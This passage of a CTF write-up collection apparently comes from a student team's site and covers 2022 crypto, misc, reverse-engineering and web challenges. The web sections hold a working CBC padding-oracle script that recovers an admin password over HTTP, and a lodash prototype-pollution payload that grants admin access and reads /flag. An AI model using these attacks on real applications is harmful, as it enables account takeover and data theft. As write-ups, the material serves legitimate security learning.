5sloves","text":"<p>\u89e3\u538b\u4e4b\u540e\u53d1\u73b0\u5c0f\u538b\u7f29\u5305\u5168\u70b8\u4e86\uff0c010\u6253\u5f00\u548c\u6b63\u5e38\u538b\u7f29\u5305\u5bf9\u6bd4\u53d1\u73b0\u65f6\u95f4\u6233\u7684\u5730\u65b9\u5c11\u4e86\u4e24\u4e2a\u5b57\u8282\uff0c\u624b\u52a8\u63d2\u8fdb\u53bb\u5c31\u80fd\u6b63\u5e38\u6253\u5f00\uff0c\u53ef\u4ee5\u89e3\u538b\u51fa\u6765\u4e00\u4e2a\u7f3a\u5c11\u6587\u4ef6\u5934\u7684png\u3002</p> <p>\u52a0\u4e0a\u5934\u548cIDHR\u5f97\u5230\u4e00\u4e2a\u5f88\u70b8\u7684png  </p> <p>\u5bbd\u5ea6\u624b\u8bd5\u51fa\u6765\u662f0fa0\uff08\u6b63\u786e\u5bbd\u5ea6\u8d8a\u8fd1\uff0c\u7ea2\u7eff\u84dd\u6761\u7eb9\u5c31\u8d8a\u89c4\u5219\uff09\uff08~~\u867d\u7136\u6211\u4e0d\u77e5\u9053\u6211\u961f\u53cb\u4e3a\u4ec0\u4e48\u6ca1\u8bd5\u8bd5\u7206CRC\u6216\u8005gimp~~\uff09\uff0c\u5c31\u80fd\u770b\u5230\u300a\u65f6\u95f4\u5f88\u91cd\u8981\u300b\u7684\u63d0\u793a \u8bfb\u65f6flag.zip\uff08\u4e00\u5f00\u59cb\u70b8\u4e86\u7684\uff09\u6587\u4ef6\u7684\u65f6\u95f4\u4fe1\u606f\uff1a</p> <pre><code>for i in range(1,31):\n    # flagx.zip\u662f\u5916\u8fb9\u76f4\u63a5\u89e3\u538b\u7684\n    dat=open(f\"flag{i}.zip\",\"rb\").read()[0x46:0x48]\n    print(dat.hex())\n</code></pre> <p>\u6ce8\u610f\u5230\u6240\u6709\u538b\u7f29\u5305\u5b9e\u9645\u65f6\u95f4\u7684\u4e24\u5b57\u8282\u5927\u63d0\u5347\u662f\u9012\u51cf\u7684\uff0c\u5c1d\u8bd5\u524d\u540e\u4ea6\u6216\uff0c\u53f3\u79fb\u7b49\u64cd\u4f5c\u65e0\u679c \u961f\u53cb\u53d1\u6765\u4e00\u53e5\u201c\u5982\u679c\u7b2c\u4e00\u4e2a\u65f6\u95f4\u5bf9\u5e94f\uff0c\u90a3\u7b2c\u4e8c\u4e2a\u5bf9\u5e94f+6=l\u201d\uff08https://chowdera.com/2022/195/202207130529022205.html \uff09\u60f3\u5230\u53ef\u4ee5\u8bd5\u8bd5\u5dee\u503c\u505a\uff0c057e-0518\u51fa\u73b0\u4e86f\uff0c\u4e4b\u540e\u662flag\uff0c\u6e38\u620f\u7ed3\u675f  </p> <pre><code>a = [ # \u4e0a\u8fb9\u7684\u8f93\u51fa\uff0c\u9519\u4f4d\n0x057e - 0x0518,\n0x0518 - 0x0584,\n0x0584 - 0x05e5,\n0x05e5 - 0x057e,\n0x057e - 0x0503,\n0x0503 - 0x0557,\n0x0557 - 0x04ee,\n0x04ee - 0x0481,\n0x0481 - 0x041c,\n0x041c - 0x03bd,\n0x03bd - 0x0374,\n0x0374 - 0x0301,\n0x0301 - 0x0360,\n0x0360 - 0x030d,\n0x030d - 0x02be,\n0x02be - 0x02eb,\n0x02eb - 0x0354,\n0x0354 - 0x03a1,\n0x03a1 - 0x03f1,\n0x03f1 - 0x03c1,\n0x03c1 - 0x0413,\n0x0413 - 0x03bf,\n0x03bf - 0x037e,\n0x037e - 0x0330,\n0x0330 - 0x02dc,\n0x02dc - 0x02bb,\n0x02bb - 0x029a,\n0x029a - 0x0279,\n0x0279 - 0x02f6,\n]\n\nfor c in a:\n    print(chr(abs(c)), end='')\n</code></pre>"},{"location":"Writeup/2022dfjk/readme/#crypto","title":"Crypto","text":""},{"location":"Writeup/2022dfjk/readme/#point-power-125pt-61solves","title":"point power 125pt 61solves","text":"<p>\u4ece \u692d\u5706\u66f2\u7ebf\u8fd0\u7b97\uff1a\u4ece\u7406\u8bba\u5230\u5b9e\u8df5  \u5904\u4e86\u89e3\u5230\uff0c\u6807\u91cf\u4e58 2 \u7684 x \u5750\u6807\u53d8\u5316\u662f\uff0c$m = \\frac{3x_1^2+a}{2y_1}, x_2 = m^2-2x_1$</p> <p>$$ m^2 = x_2 + 2 * x_1\\ \\frac{(3 x_1^2 + a)^2}{4 y_1^2} = m^2\\ y_1^2 = x_1^3 + ax_1 + b\\ (3 x_1^2 + a)^2 = 4 m^2 x_1^3 + 4 m^2 a x + 4 m^2 b\\ 9 x_1^4 + 6x_1^2 a + a^2 = 4 m^2 * x^3 + 4 m^2 x_1 a + 4 m^2 b\\ a^2 + (6 x_1^2 - 4 m^2 x_1) a + 9 x_1^4 - 4 m^2   x_1^3 - 4 m^2 b = 0 (mod P)\\ $$</p> <p>\u6700\u540e\u89e3\u6a21\u610f\u4e49\u4e0b\u7684\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u5373\u53ef\u3002</p> <pre><code>from Crypto.Util.number import *\n\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n\nmq = x2 + 2 * x1\nmq4 = 4 * mq\nbb = 6 * x1^2 - mq4 * x1\ncc = 9 * x1^4 - mq4 * x1^3 - mq4 * b\n\n\nP.&lt;X&gt; = PolynomialRing(GF(p))\nf = X^2 + bb*X + cc\nr = f.roots()\nfor x, _ in r:\n    print(long_to_bytes(x))\n\n</code></pre>"},{"location":"Writeup/2022dfjk/readme/#strange-curve-104pt-78solves","title":"strange curve 104pt 78solves","text":"<p>\u5148\u770b\u4e00\u4e0b flag \u662f\u600e\u4e48\u6d41\u7684\uff1a</p> <pre><code>x = bytes_to_long(flag)\n\nwhile True:\n    try:\n        ...\n    except:\n        x += 1\n\nP = (x, y)\nprint(f\"P = {P}\")\n'''\nP = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)\n'''\n</code></pre> <p>\u867d\u7136\u6709\u4e00\u4e2a while True \u91cc\u9762\u6709 <code>x += 1</code>\uff0c\u4f46\u662f\u53ef\u4ee5\u76f2\u731c\u52a0\u7684\u6b21\u6570\u4e0d\u662f\u5f88\u591a\uff0c\u5927\u6982\u53ea\u4f1a\u5f71\u54cd\u540e\u9762\u51e0\u4e2a byte\u3002 \u800c\u4e14\u540e\u9762\u7684 <code>print(P)</code> \u8f93\u51fa\u4e86 <code>x</code>\uff0c\u7136\u540e\u76f4\u63a5 <code>long_to_bytes(56006392793...)</code>\uff0c\u5c31\u62ff\u5230\u4e86  <code>flag{b7f209df-1284-4bdf-b030-28197483c47b}</code>\u3002 ~~\u6240\u4ee5\u8bf4 <code>x += 1</code> \u751a\u81f3\u6ca1\u52a0\u8fc7~~</p>"},{"location":"Writeup/2022dfjk/readme/#web","title":"Web","text":""},{"location":"Writeup/2022dfjk/readme/#babyweb-173pt-39solves","title":"babyweb 173pt 39solves","text":"<p>\u6839\u636e\u63d0\u793a\uff0c\u5b58\u5728 CBC Padding Oracle</p> <p>\u89c2\u5bdf\u548c\u5c1d\u8bd5\u53ef\u5f97\uff0c\u5bc6\u7801\u6709 64 \u4f4d\uff0c\u4fee\u6539\u7b2c 36 \u81f3 63 \u4f4d\u4f1a\u53d1\u751f padding error\uff0c\u6240\u4ee5\u731c\u6d4b chunk \u662f 16 \u4f4d\u3002 \u5df2\u77e5 CBC \u6bcf\u4e00\u5757\u7684\u89e3\u5bc6\u6d41\u7a0b\u662f\uff1acipher ---AES---&gt; intermedian ---xor iv---&gt; plain text\u3002  \u7136\u540e\u5728\u76f8\u90bb\u4e24\u7ec4\u4e4b\u95f4\uff0c\u524d\u4e00\u4e2a\u7684 ciphertext \u4f5c\u4e3a\u540e\u4e00\u7ec4\u7684 iv\u3002\u6211\u4eec\u53ef\u4ee5\u679a\u4e3e iv \u6700\u540e\u4e00\u4e2a\u4f4d\uff0c\u770b\u770b\u54ea\u4e2a byte \u53ef\u4ee5\u8ba9\u89e3\u5bc6\u51fa\u6765\u7684\u6587\u672c\u7684 padding \u4e3a 0x01\uff08\u6b64\u65f6\u5c31\u4e0d\u4f1a\u7206 padding error \u4e86\uff09\uff0c\u8fd9\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u628a 0x01 \u548c iv \u7684\u6700\u540e\u4e00\u4f4d\u5f02\u6216\u4e00\u4e0b\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 intermedian \u7684\u6700\u540e\u4e00\u4f4d\u4e86\u3002 \u4ee5\u6b64\u7c7b\u63a8\uff0c\u5c31\u53ef\u4ee5\u6478\u5230 intermedian \u7684\u5168\u90e8\u503c\u3002\u518d\u62ff intermedian \u5f02\u6216\u771f\u6b63\u7684 iv\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230\u660e\u6587\u3002\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7f51\u4e0a\u5df2\u7ecf\u6709\u5f88\u591a\u5173\u4e8e CBC Padding Oracle Attack \u7684\u6559\u7a0b\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u8d58\u8ff0\u4e86\u3002 \u7136\u540e\u5bf9\u4e8e\u6bcf\u76f8\u90bb\u7684\u4e24\u4e2a\u5757\uff0c\u90fd\u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u5f0f\u7206\u7834\u51fa\u540e\u4e00\u4e2a\u5757\u7684 intermedian \u503c\uff0c\u8fdb\u800c\u62ff\u5230\u8fd9\u4e00\u5757\u7684\u660e\u6587\u3002</p> <p>\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>import base64\nimport requests\nfrom Crypto.Util.strxor import strxor\nfrom Crypto.Util.Padding import unpad\n\nsession = 'eyJhZG1pbl9wYXNzd29yZCI6IlNwOTlRNU9DN2NTb2VrWlRkZFRQZEE3RHpMUWJpUGtSTWwzRDBiMmJ3YS95dmZMSEc2YWpWRVhScmh3cGVVVDYrNmlWYTRja2dKd0FsL2pHcy91L0JBPT0iLCJpc2FkbWluIjpmYWxzZX0.YvzJYQ.6hevEiFyct_BhWVc8WtfmZf5qf0'\npassword = list(base64.b64decode(b'Sp99Q5OC7cSoekZTddTPdA7DzLQbiPkRMl3D0b2bwa/yvfLHG6ajVEXRrhwpeUT6+6iVa4ckgJwAl/jGs/u/BA=='))\n\ndef chunks(lst, n):\n    for i in range(0, len(lst), n):\n        yield lst[i:i + n]\n\ngroups = list(chunks(password, 16))\n\ndef get(password):\n    payload = { 'username': 'admin', 'password': 'admin' }\n    cookies = { 'session': session, 'admin_password': base64.b64encode(bytes(password)).decode() }\n    r = requests.post('http://eci-2ze2vftwh3e6xhybsqxm.cloudeci1.ichunqiu.com/login', cookies=cookies, data=payload)\n    return r.text\n\ntext = b''\nfor chunk in range(3):\n    intermedia = [0] * 16\n    for i in range(1, 16 + 1):\n        for j in range(256):\n            intermedia[-i] = j\n            iv = [i] * 16\n            for k in range(16):\n                iv[k] ^= intermedia[k]\n            result = get(iv + groups[chunk + 1])\n            print('{:3d} =&gt; {}'.format(j, result))\n            if result == 'False':\n                break\n        print(intermedia)\n    text += strxor(bytes(intermedia), bytes(groups[chunk]))\nprint(unpad(text))\n</code></pre> <p>\u7136\u540e\u62ff\u5230\u660e\u6587\u5bc6\u7801\u4e4b\u540e\uff0c\u7528 <code>admin</code> \u767b\u5f55\u4e00\u4e0b\uff0c\u5c31\u62ff\u5230\u4e86 flag\u3002</p>"},{"location":"Writeup/2022dfjk/readme/#re","title":"Re","text":""},{"location":"Writeup/2022dfjk/readme/#obfpuzz400pt-6solves","title":"ObfPuzz\uff08\u4e8c\u8840\uff09400pt 6solves","text":"<p>\u5206\u6790php\u6587\u4ef6\uff0c\u6ce8\u610f\u4ee5\u4e0b\u51e0\u70b9\uff1a - vardump\u7684\u8c03\u7528 - \u5339\u914d\u6210\u529f\u9700\u8981\u56fa\u5b9a\u7684\u6b63\u786e\u524d\u7f00\uff0c\u957f\u5ea6\u4e0d\u8d85\u8fc7500 - \u6574\u6bb5\u5185\u5bb9\u5fc5\u987b\u662f\u552f\u4e00\u7684\uff0c\u867d\u7136\u6210\u529f\u9700\u8981\u6b63\u786e\u524d\u7f00\uff0c\u4f46\u662f\u751f\u6210flag\u662f\u6574\u6bb5\u5185\u5bb9\u3002</p> <p>IDA\u6253\u5f00so\uff0c\u641c\u7d22\u5b57\u7b26\u4e32\u770b\u770b\u662f\u4e0d\u662fRealWordRE\uff0c\u7136\u540e\u770b\u5230\u4e86flag\u5b57\u6837\uff0cx\u8ddf\u5165\u5206\u6790\u53d1\u73b0\u53ef\u80fd\u662f\u4e00\u4e2a\u6709\u5411\u56fe\u7684\u7ec8\u70b9\uff0c\u5199\u811a\u672c\u53cd\u5411dfs\u53d1\u73b0\u4f1a\u6b7b\u5faa\u73af\uff1a</p> <p>\u811a\u6b65\u9700\u8981\u7684\u624b\u52a8\u64cd\u4f5c\uff1an\u91cd\u547d\u540d<code>flag!!</code>\u6240\u5728\u7684\u51fd\u6570\u4e3alast</p> <pre><code># \u8fd9\u91cc\u7684visit\u5199\u70b8\u4e86\ndef dfs(name, pwd, visit, dept):\n    if name == \"sub_1443\":\n        print(name, \"\".join(pwd))\n        input(\"win!!!\")\n    if dept &gt; 500 or name in visit:\n        return\n    try:\n        print(name, \"\".join(pwd))\n        func = idaapi.get_func(get_name_ea_simple(\"_\"+name)) \n        ea = func.start_ea\n        ref = DataRefsTo(ea)\n        next(ref) # skip plt\n        got = next(ref)\n        useages = DataRefsTo(got)\n        useages_rand = [u for u in useages]\n        random.shuffle(useages_rand)\n        for fun in useages_rand:\n            code = str(idaapi.decompile(fun))\n            switch = re.findall(\"if \\( v3 == (.*?) \\)\\n.*?= \"+name+\";\",code)\n            if (len(switch)&gt;0):\n                func_name = re.findall(\"unsigned __int64 __fastcall (.*?)\\(\",code)[0]\n                c_pass = pwd.copy()\n                c_visit = visit.copy()\n                c_visit.append(name)\n                c_pass.append(chr(int(switch[0]))) # assert only 1\n                dfs(func_name, c_pass, c_visit, dept+1)\n            else:\n                print(\"Dead\")\n    except:\n        pass\n\ndfs('last', [], [],  0)\n</code></pre> <p>\u6362\u6210\u6240\u6709\u8282\u70b9\u53ea\u8bbf\u95ee\u4e00\u6b21\uff0cqueue\u5f88\u5feb\u8dd1\u5230\u4e86\u8d77\u70b9\uff0c\u5e76\u8f93\u51fa\u8282\u70b9\u76f8\u5173\u4fe1\u606f\u53ef\u89c6\u5316\u5efa\u56fe\u5982\u4e0b\uff1a  \u53d1\u73b0\u6709\u91cd\u8fb9\uff0c\u4e0d\u8003\u8651\u91cd\u8fb9\u4e5f\u5b58\u5728\u73af\uff0c\u6700\u77ed\u8def\u548c\u6700\u957f\u8def\u505a\u7b54\u6848\u90fd\u4e0d\u6b63\u786e\uff0c\u4e8e\u662f\u4ece\u8d77\u70b9(\u6709oops\u51fd\u6570\u8ddf\u8fdb\u7684F\u5b57\u6bcd)\u51fa\u53d1\uff0c\u6539\u811a\u672c\u7206\u51fa\u6240\u6709\u4e0d\u8d70\u91cd\u590d\u8282\u70b9\u7684\u7b54\u6848\uff08\u4fdd\u8bc1\u89e3\u662f\u6709\u9650\u7684\uff09\uff1a</p> <pre><code>import queue\n\n\nbuffer_next = {}\ndef get_next(name):\n    global buffer_next\n    if name in buffer_next:\n        for item in buffer_next[name]:\n            yield item\n    else:\n        buffer = []\n        try:\n            func = idaapi.get_func(get_name_ea_simple(\"_\" + name))\n            code = str(idaapi.decompile(func))\n            switch = re.findall(r\"if \\( v3 == (.*?) \\)\\n.*?= (.*?);\", code)\n            if len(switch) &gt; 0:\n                for pair in switch:\n                    key, func_name = chr(int(pair[0])), pair[1]\n                    print('{} =&gt; {}'.format(name, func_name))\n                    buffer.append((key, func_name))\n                    yield (key, func_name)\n            buffer_next[name] = buffer\n        except Exception as e:\n            print(e)\n\ndef advanced_dfs():\n    q = queue.Queue()\n    q.put(('sub_1443', '', '', set(['sub_1443'])))\n\n    while not q.empty():\n        now, father, path, visited = q.get()\n        if now == 'last':\n            print(len(path), path)\n            continue\n\n        for key, next_name in get_next(now):\n            if next_name in visited:\n                continue\n            visited_copy = visited.copy()\n            visited_copy.add(next_name)\n            q.put((next_name, now, path + key, visited_copy))\n\nadvanced_dfs()\n</code></pre> <p>\u62ff\u6240\u6709\u8f93\u51fa\u7206\u672c\u5730\u670d\u52a1\u5668\uff1a</p> <pre><code># dat='''\u4e0a\u8fb9IDA-Python\u7684\u8f93\u51fa'''\nimport requests\nfor i in dat.split(\"\\n\"):\n    r=requests.get(\"http://ip:1447/?flag=\"+i.split(\" \")[1])\n    if (\"flag{\" in r.text):\n        print(r.text)\n        print(i)\n</code></pre> <p>\u5728\u6240\u6709\u7ed3\u679c\u4e2d\u8dd1\u51fa\u4e86\u6b63\u786e\u7684\u90a3\u4e2a</p> <pre><code>[debug]: verify(374)\nflag!!!&lt;br&gt;int(0)\nSUCCESS\n&lt;br&gt;&lt;br&gt;win! your flag is: flag{4ed4c7872f71240d75624ff04d25631f}\n374 FSTVHUReZ13z9UYDNTwDUwJSAFjPEUbs1oii61Q79GZnqWoIMu4W8e6n6iy9oi9ElOcRKA8yMwRjJblt5xu5KOBOc3XBOPM3VDFrihROOMpjPs4ZevQrDmkppC74k2XjzqbiJkMuVHeq8iVWWyiw9W0glTEth348odMbKTABtjoZEE94uqQomly4emxwKLZyPsMPCUXyFmacSXFebwIZmbHBDaRw0AAKMEVpbaIFV3p57WiTsbDkey1UL4LBttYIH4BXQZJ51p7hjRdW8yo6WH33XROfXnFpYBP44wkRJhxQHWGVDdmluUTEHDu0DdhsDCghrGqrBoZIJttSwrIjisxdeBtj5A6Ch2LKkanHNguUefegZrqVCo\n</code></pre>"},{"location":"Writeup/2022dfjkjs/wp/","title":"2022\u5dc5\u5cf0\u6781\u5ba2\u51b3\u8d5b","text":"<p>Rank: 10</p>"},{"location":"Writeup/2022dfjkjs/wp/#strangetemporature","title":"StrangeTemporature","text":"<p>Extract nth base64 bytes from modbus/tcp protocl.</p> <pre><code>ZmxhZ3s5N2JmZWIwMy1mYTVjLWFhNmYtYWQxZS05YzVkMzhjNzQ0OWV9\n</code></pre> <p>From Base64:</p> <pre><code>flag{97bfeb03-fa5c-aa6f-ad1e-9c5d38c7449e}\n</code></pre>"},{"location":"Writeup/2022dfjkjs/wp/#nodesystem","title":"Nodesystem","text":"<p>In the POST /api we can use an arbitrary filename, find the directory:</p> <pre><code>{\"auth\": {\"name[]\":\"admin\", \"password[]\":true}, \"filename\" : \"test\"}\n</code></pre> <p>Use the <code>index.js</code> we can find the source code.</p> <pre><code>const express = require('express'); \nconst bodyParser = require('body-parser'); \nconst _ = require('lodash'); \nconst app = express(); \nvar fs = require('fs'); \n\napp.set('view engine', 'pug'); \napp.set('views', 'views'); \n\napp.use(bodyParser.urlencoded({ extended: true })); \napp.use(express.static('static')); \n\nconst users = [\n  { name: 'test', password: 'test' }, \n  { name: 'admin', password: Math.random().toString(32), admin: true }, \n]; \n\nlet messages = []; \nlet lastId = 1; \n\nfunction findUser(auth) { \n  return users.find((u) =&gt; \n    u.name === auth.name &amp;&amp;                                                                   \n    u.password === auth.password); \n } \n\napp.use(bodyParser.json()); \n\napp.get('/users', (req, res, next) =&gt; { \n  const lists = users; \n  res.render('users', { lists: lists, pageTitle: 'List of Users', path: '/users' }); \n }); \n\napp.get('/', (req, res, next) =&gt; { \n  res.render('home', { pageTitle: 'Home', path: '/' }); \n }); \n\napp.post('/', (req, res, next) =&gt; { \n  users.push({ name: req.body.name, password: req.body.password }); \n  res.redirect('/users'); \n }); \n\napp.get('/message', (req, res) =&gt; { \n  res.send(messages); \n }); \n\napp.put('/message', (req, res) =&gt; { \n  const user = findUser(req.body.auth || {}); \n  console.log(req.body.auth); \n  console.log(user); \n  if (!user) { \n    res.status(403).send({ ok: false, error: 'Access denied' }); \n    return; \n } \n\n  const message = { \n    avator: '= =', \n }; \n\n  _.merge(message, req.body.message, { \n    id: lastId++, \n    userName: user.name, \n }); \n\n  messages.push(message); \n  res.send({ ok: true, message: message }); \n }); \n\napp.delete('/', (req, res) =&gt; { \n  res.send({ ok: true }); \n }); \n\napp.post('/upload', (req, res) =&gt; { \n  res.send({ ok: true }); \n }); \n\napp.post('/api', (req, res) =&gt; { \n    const user = findUser(req.body.auth || {}); \n    if(!user) { \n        res.status(403).send({ ok: false, error: 'Access denied' }); \n        return; \n     } \n\n    filename = req.body.filename; \n    testFolder = \"/app/\";\n      fs.readdirSync(testFolder).forEach(file =&gt; {\n        if (file.indexOf(filename) &gt; -1) {\n          var buffer = fs.readFileSync(filename).toString();\n          res.send({ok: true, content: buffer});\n          }\n        });\n    });\n\napp.post('/debug', (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n  if (!user || !user.admin) {\n    res.status(403).send({ok: false, error: 'Access denied'});\n    return;\n  }\n  var buffer = fs.readFileSync('/flag').toString();\n  res.send({ok: true, content: buffer});\n  });\n\napp.listen(80, () =&gt; {\n    console.log('Listening port 80');\n    });\n</code></pre> <p>In the message function, we can put a prototype pollution.</p> <pre><code>{\"auth\": {\"name\":\"test\", \"password\":\"test\"},\"message\":{\"admin\":true},\"message\":{\"__proto__\":{\"admin\":true}}}\n</code></pre> <p>Then request POST /debug:</p> <pre><code>{\"auth\": {\"name\":\"test\", \"password\":\"test\"}, \"filename\":\"index.js\"}\n</code></pre> <pre><code>flag{bb5c92fd-e976-482d-bd8d-fe75c7709473}\n</code></pre>"},{"location":"Writeup/2022dfjkjs/wp/#gcd","title":"gcd","text":"<p>Find this article: https://math.stackexchange.com/questions/985085/attack-on-rsa-factoring-when-knowing-e-and-d</p> <p>Then use the method from this pptx: https://web.archive.org/web/20081122133715/https://www.cs.purdue.edu/homes/ninghui/courses/Fall04/lectures/lect14-c.pdf</p> <pre><code>from math import gcd\nfrom Crypto.Util.number import long_to_bytes\n\nq = 159525841996122259638149337206281835567662617929665920269309853980712285666023866332657448035118551608001550994903698308487351441079422360280138462655773347141043597936907238815312380200758714954107355308055568297512583285577797251677925038300853004432614390391636707991425386888624638839063346101278704535117\np = 103688092798943310982647402600171114966652177364073806894252414673051932505190807013641061853384728919598237520908212107621239686924781921343629185171175594445990343702682252985633398911055809553488617609113015580598645062510893878938013992487439634057319597008364777435777902433026095622460842345150901944567\n\nn = 1715097516831775561161353747739509313962850384763754284193603064705990003183954750857689649540587082555847904377918426763475079170697690469267290454724999354302036981034615698694153403754870938739225201770934147845874793740053505575413463153429315475539039712818850905666950096326806695688446947957198050957270336443016980023115464136303403780696015358461369838964806435293267645492940773964907954737849962270208167145137818071024789445448292917016422004351584109968952746852305729861258178402122017513103311904147173869605944992973485253275501741635308107788593258463591060922145241960065862813218690280146883588390356662245698217956617720339878472430817614915509896516775918109916920083183701011823993137753987826242193055167215287839864164955881557719443664876504155709359476375455266912247205663953373944852046907623883953483708248467223346798885142046228485310724692353541792975390854356153906879056788972704718688261213\nx = 13693034247131001247611357013365838905472128629161269384100755984286945944986882779020879733934334461215591081830359749241927901759168319107452036275703768755532293338513836146556306490425526394420440685291299327486258632666082657664827474947846307949205548526817689180357262646108048851554962291154624349603853599623877095789135051759890435127891210971940795915429197420232561510826760487552089621705187244655827668509013761027910519038664267576214742561936826964572261315984043602119812357324667105678247267841445497640859880436819217418374184256023378843611198818733281625017307272013394628328908242726204785568269\nc = 1207106262178445359018459948589897274651891185968586806427714234447059397099330669443037189913958678506147447588787686432870791586266645067569198511010947847769438531195366288233395081813524859121328300315116211130908169351354477893647936383056584771268247471788727296968981371535384241445434057942795625350351461517179136190258136244456887118978348223420158887403238429201791427682781494296473806409015961385580794909106746874670027369932286414096790928966277930586468864071103687837936910843559150279603968747213779555572156135983177121194768041838538456267670795923361920648635769732101772513407467158904982779342496410211785417729464008786654808126619152228029357660596380038858050797654917902576424059433048290426186067840363899227577713800670585547473870112798624948349947633855963137174688403113603549470708467306886181387445601800049442519922530086418265660642841544022198981442640591637598035257382429976435264690303\n\nassert n == p * p * q\n\ne = 65537\nphi = p * (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n\nraise Exception()\n\nr = n * x - 1\nwhile r % 2 == 0:\n    r //= 2\n\nw = 3793879\nw = pow(w, r, n)\nv = pow(w, 2, n)\nwhile v != 1:\n    w = v\n    v = pow(w, 2, n)\n    if gcd(w - 1, n) != 1:\n        print(gcd(w - 1, n))\n    if gcd(w + 1, n) != 1:\n        print(gcd(w + 1, n))\n</code></pre> <pre><code>flag{bs903sk_fbnw34f8_cwn3efh}\n</code></pre>"},{"location":"Writeup/2022dfjkjs/wp/#babyprotocol","title":"babyProtocol","text":"<p>Use IOA concat flag:</p> <pre><code>flag{68b34d92d8a8445039dce-d6819d2362d5}\n</code></pre> <pre><code>import json\n\ns = json.load(open(\"e:\\\\desk\\\\2.json\", \"r\", encoding=\"utf8\"))\nd = ['*' for _ in range(99)]\nfor i in s:\n    try:\n        r = i['_source']['layers']['iec60870_asdu'].keys()\n        for j in r:\n            if \"IOA\" in j:\n                dat = i['_source']['layers']['iec60870_asdu'][j]\n                idx = int(dat['iec60870_asdu.ioa'])\n                c = chr(int(dat[\"iec60870_asdu.bcr.count\"]))\n                print(dat)\n                if d[idx] != \"*\" and d[idx] != c:\n                    raise Exception(\"FUCK\")\n                if dat['iec60870_asdu.bcr.iv'] != '1':\n                    d[idx] = c\n    except KeyError:\n        pass\n\nprint(''.join(d))\n</code></pre> <p>Remove all frames that IV=1</p> <pre><code>flag{68b34d92d88445039dced6819d2362d5}\n</code></pre>"},{"location":"Writeup/2022mtctf/HED/","title":"2022\u7f8e\u56e2\u7f51\u7edc\u5b89\u5168\u9ad8\u6821\u6311\u6218\u8d5b-HED-WriteUp","text":"<p>Rank: 19 1185pts 6Solved </p> <p><code>HED \u662f\u5357\u65b9\u79d1\u6280\u5927\u5b66COMPASS\u5b9e\u9a8c\u5ba4\u7684CTF\u6218\u961f</code></p> <ul> <li>2022\u7f8e\u56e2\u7f51\u7edc\u5b89\u5168\u9ad8\u6821\u6311\u6218\u8d5b-HED-WriteUp</li> <li>MISC</li> <li>CyberSpace(\u4e00\u8840)</li> <li>RE</li> <li>RE-small</li> <li>PWN</li> <li>\u6349\u8ff7\u85cf</li> <li>WEB</li> <li>babyjava(\u4e00\u8840)</li> <li>OnlineUnzip</li> <li>Crypto</li> <li>strange_rsa1</li> </ul>"},{"location":"Writeup/2022mtctf/HED/#misc","title":"MISC","text":""},{"location":"Writeup/2022mtctf/HED/#cyberspace","title":"CyberSpace(\u4e00\u8840)","text":"<p>~~\u9898\u76ee\u51fa\u9505\u4e86\uff0c\u6240\u4ee5\u5148\u54c1\u9274\u4e86\u4e00\u4e0b\u9898\u76ee\u7684\u6e90\u7801\u3002~~ \u961f\u91cc\u7684\u5bc6\u7801\u5c0f\u59d0\u59d0\u662f\u662f\u4fe1\u606f\u7ade\u8d5b\u9009\u624b\uff0c\u4e00\u773c\u5c31\u770b\u51fa\u6765\u8fd9\u662f\u5355\u8c03\u961f\u5217\u5165\u95e8\u9898\u3002 \u5176\u4e2d\u4e00\u79cd\u6700\u4f18\u89e3\u662f\uff0c\u5728\u6570\u5217\u4e0a\u5347\u7684\u65f6\u5019\u8fdb\u884c\u4e0a\u5347\u6570\u91cf\u7684 add_l\uff0c\u5728\u6570\u5217\u4e0b\u964d\u7684\u65f6\u5019\u8fdb\u884c\u4e0b\u964d\u6570\u91cf\u7684 add_r\uff0c\u8fd9\u6837\u76f8\u5f53\u4e8e\u5728 [add_l, add_r - 1] \u533a\u95f4\u4e2d\u5168\u90e8 +1\u3002 \u4ee4\u4eba\u611f\u53f9\u7684\u662f\uff0c\u8fd9\u9898\u4fee\u5b8c\u91cd\u65b0\u4e0a\u7ebf\u7684\u65f6\u5019\uff0c\u5c0f\u59d0\u59d0\u8fd8\u5728\u5916\u9762\u5403\u996d\uff0c\u56de\u6765\u4ee5\u540e\u7adf\u7136\u8fd8\u662f\u6ca1\u6709\u4eba\u505a\u51fa\u6765\u3002\u4e3a\u62a2\u4e00\u8840\u8d76\u7d27\u6413\u4e2a\u811a\u672c\uff0c\u4ea4\u4e92\u90fd\u4e0d\u5199\u4e86\uff0c\u76f4\u63a5\u7c98\u8d34\u8f93\u5165\u3002</p> <pre><code>target = [83, 111, 54, 42, 72, 96, 111, 78, 33, 124, 50, 87, 119, 73, 42, 78, 83, 42, 97, 54, 39, 43, 121, 65]\ntarget.append(0)\n\nans = []\nl = []\ncnt = 0\ncur = 0\nfor i in range(len(target)):\n    if target[i] &gt; cur:\n        cnt += target[i] - cur\n        l = l + [i for _ in range(target[i] - cur)]\n    elif target[i] &lt; cur:\n        for _ in range(cur - target[i]):\n            ans.append((l[-1], i))\n            l.pop()\n    cur = target[i]\n\nprint(cnt, len(ans))\nprint()\n\nfor item in ans:\n    print('1')\n    print(item[0])\n    print(item[1])\n\n</code></pre> <pre><code>Congratulations this is your flag\nu8 b= 32 | 38 | 27 | 33 | 53 | 30 | 35 | 32 | 32 | 31 | 44 | 31 | 40 | 46 | 25 | 50 | 41 | 44 | 55\nu8 a=[19]\nu8 